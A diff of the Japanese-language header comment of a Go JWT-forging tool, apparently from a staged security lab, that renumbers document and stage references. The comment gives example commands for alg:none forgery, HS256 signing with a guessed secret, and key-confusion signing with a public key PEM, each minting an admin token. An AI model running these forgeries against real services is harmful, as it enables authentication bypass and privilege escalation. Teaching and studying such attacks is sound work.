@@ -2,18 +2,18 @@
 // ライブラリもサーバも使わない。標準出力にトークンだけを出すので、
 // curlと組み合わせられる: TOKEN=$(go run ./tools/forge -header '...' -payload '...')
 //
-// 例(手順の全体はdocs/05, 06, 07を参照):
+// 例(手順の全体はdocs/04, 05, 06を参照):
 //
-//	# alg:none偽造 (stage2)
+//	# alg:none偽造 (stage3)
 //	go run ./tools/forge -header '{"alg":"none","typ":"JWT"}' \
 //	  -payload '{"sub":"mallory","role":"admin","exp":9999999999}'
 //
-//	# 推測/既知の鍵で署名 (stage3, stage4の混同攻撃)
+//	# 推測/既知の鍵で署名 (stage4, stage5の混同攻撃)
 //	go run ./tools/forge -header '{"alg":"HS256","typ":"JWT"}' \
 //	  -payload '{"sub":"mallory","role":"admin","exp":9999999999}' \
 //	  -secret sunny
 //
-//	# ファイルのバイト列そのもので署名 (stage4: 取得した/pubkeyのPEM)
+//	# ファイルのバイト列そのもので署名 (stage5: 取得した/pubkeyのPEM)
 //	go run ./tools/forge -header '{"alg":"HS256","typ":"JWT"}' \
 //	  -payload '{"sub":"mallory","role":"admin","exp":9999999999}' \
 //	  -secret-file pubkey.pem
